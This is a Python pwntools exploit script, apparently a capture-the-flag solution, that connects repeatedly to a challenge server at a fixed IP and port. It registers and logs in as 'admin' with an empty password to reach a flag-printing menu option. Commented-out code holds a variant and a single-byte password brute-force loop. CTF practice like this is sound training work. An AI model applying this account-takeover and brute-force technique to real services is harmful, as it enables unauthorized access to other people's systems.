#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 103.41.207.206 --port 17020 ./begin
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./begin')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '103.41.207.206'
port = int(args.PORT or 17020)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b *0x0000555555555bb1
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# def login(user,pas):
#     io.sendlineafter("> ","2")
#     io.sendlineafter(": ",str(user))
#     io.sendlineafter(": ",str(pas))

# def create(user,pas):
#     io.sendlineafter("> ","3")
#     io.sendlineafter(": ",str(user))
#     io.sendlineafter(": ",str(pas))

def login(user,pas):
    io.sendline("2")
    io.sendline(str(user))
    io.sendline(str(pas))

def create(user,pas):
    io.sendline("3")
    io.sendline(str(user))
    io.sendline(str(pas))


while 1:
    io = start()
    create('admin','')
    login("admin",'')
    io.sendline('4')
    data = io.recvall()
    if "hacktoday" in data:
        print data
        io.interactive()
        break

# while 1:
#     io = start()
#     create('admin','a')
#     login("admin",'a')
#     io.sendline('4')
#     # io.recv()
#     # io.sendline('4')
#     data = io.recvall()
#     # if 'Login failure' not in data and "Account already exists" not in data:
#     # if 'Login failure' not in data :
#     if 'hacktoday' in data :
#         print data
        
#         io.interactive()
#         break

# for i in range(255):
#     try:
#         data=login("admin",str(chr(i)+'\x00'))
#         if 'Login failure' not in data:
#             print i
#             break
#     except:
#         pass


# io.interactive()

